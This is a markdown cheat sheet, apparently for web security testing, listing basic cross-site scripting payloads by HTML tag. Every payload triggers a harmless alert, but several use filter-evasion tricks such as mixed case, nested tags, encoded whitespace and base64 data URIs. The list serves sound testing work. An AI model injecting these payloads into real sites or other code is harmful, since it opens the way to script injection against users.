# A Collection of XSS Payload

Only some basic payloads, without using any encoding tricks.

### SCRIPT Basic Payload

```
<script>alert(123);</script>
<script>alert(123)</script>
<script>alert`123`</script>
<script>alert("XSS")</script>
<script>alert('XSS')</script>
<script>alert(/XSS/)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(document.domain)</script>
<sCRipT>alert(123)</sCRipT>
<scr<script>ipt>alert(123)</scr<script>ipt>

<script>prompt(123)</script>
<script>confirm(123)</script>
```

### IMG Payload

```
<img src=x onerror=alert(123);>
<img src=x onerror=alert(123)>
<img src=x onerror=alert`123`>
<img src=x onerror=alert(123)//abc  >
<img src=x onerror="alert(123)">
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83))>
```

> **NOTE:** Other tags that could use "src" attribute: **&lt;audio&gt;, &lt;video&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;embed&gt;**

```
<img/src='x'/onerror=alert(123)>
<img/src/onerror=alert(123)>
```

> **NOTE:** Other tags that could be used like this: **&lt;audio&gt;, &lt;video&gt;, &lt;script&gt;**

```
<embed src=x onload=alert(123)>
<iframe src=x onload=alert(123)>
<iframe/src/onload=alert(123)>
```

### IFRAME Payload

```
<iframe src=x onload=alert(123)>
<iframe/src/onload=alert(123)>
<iframe src="javascript:alert(123)">
<iframe src=javascript:alert(123)>
<iframe src=javascript:alert`123`>
<iframe/src=javascript:alert(123)>
<iframe/src="data:text/html,<svg/onload=alert(123)>">
<iframe/src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMTIzKT4=">

<embed/src="data:text/html,<svg/onload=alert(123)>">
<embed/src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMTIzKT4=">

<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

```
<iframe src="jav&#x09;ascript:alert(123)">
```

> **NOTE:** Embed encoded tab.


```
<iframe src="jav&#x0A;ascript:alert(123)">
```

> **NOTE:** Embed encoded newline.

```
<iframe src="jav&#x0D;ascript:alert(123)">
```

> **NOTE:** Embed encoded carriage return.

### SVG Payload

```
<svg onload=alert(123)>
<svg onload=alert(123)//abc >
<svg/onload=alert(123)>
<svg id=alert(123) onload=eval(id)>
```

### Other Payloads

```
<a href="javascript:alert(123)">123</a>
<a href=javascript:alert(123)>123</a>
<a/href="javascript:alert(123)">123</a>
```

```
<body onload=alert(123)>
<body/onload=alert(123)>
<body/onload=alert(123)//abc >
```

> **NOTE:** Other tags that could be used like this: **&lt;style&gt;**

```
<input onmouseover=alert(123)>
<input/onmouseover=alert(123)>
<input autofocus onfocus=alert(123)>
```

> **NOTE:** Other tags that could be used like this: **&lt;select&gt;, &lt;testarea&gt;**

```
<details open ontoggle=alert(123)>
<details/open/ontoggle=alert(123)>
<details/open/ontoggle="alert(123)">
```

```
<script>
foo="text</script><script>alert(123)</script>";
</script>

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

```
<var onmouseover=alert(123)>var</var>
<var/onmouseover=alert(123)>var</var>
```

```
<x onclick=alert(123)>click here
<x/onclick=alert(123)>click here
<x onmouseover=alert(123)>mouseover here
<x/onmouseover=alert(123)>mouseover here
```
